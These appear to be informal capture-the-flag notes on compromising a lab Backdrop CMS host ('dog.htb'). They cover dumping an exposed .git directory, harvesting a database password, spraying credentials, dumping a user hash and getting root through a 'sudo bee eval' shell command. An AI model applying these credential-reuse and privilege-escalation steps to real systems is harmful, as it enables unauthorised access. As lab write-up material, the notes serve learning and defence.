___


# User


Powered by [Backdrop CMS](https://backdropcms.org)

apache [2.4.41]


.git directory was found

-> there is hella dirs an ?q= in robots.txt

get git objects and explore that shit


*dumped and extracted .git dir*


$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

BackDropJ2024DS2024


I think  nothing else in here ? more enum -> subdomains + feroxbuster

dogBackDropSystem

dogBackDropSystem2024DS2024

-> this is a user on site


$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';


*found backdrop version*

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662

*next time search the docs for the cms to find a file that gives  you the version*
*bruvs i spent so long looking :0*


*if you do grep -R "@dog.htb" to look for other accounts and spray creds into tiffany account u get access into the web ui*


*got a shell*

$ cd home
$ ls
jobert
johncusack


*dumped the users mysql table after upgrading my shell*


*jobert hash*
$S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1



*johncusack is the user with the user.txt flag so maybe try cracking that hash cause this finna take forever at this rate*

*jobert and johncusack are the 2 users with home dirs *


database password works on johncusack user


# Root


*this is prob its*

johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on
        dog:
    (ALL : ALL) /usr/local/bin/bee


*this got me root*

**Priv Esc When bee can run without password** 
#BackDrop CMS 
sudo bee eval "system('/bin/bash');"

#In case of `The required bootstrap level for 'eval' is not ready.` Error
#Find the application path  - generally in /var/www/html
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"

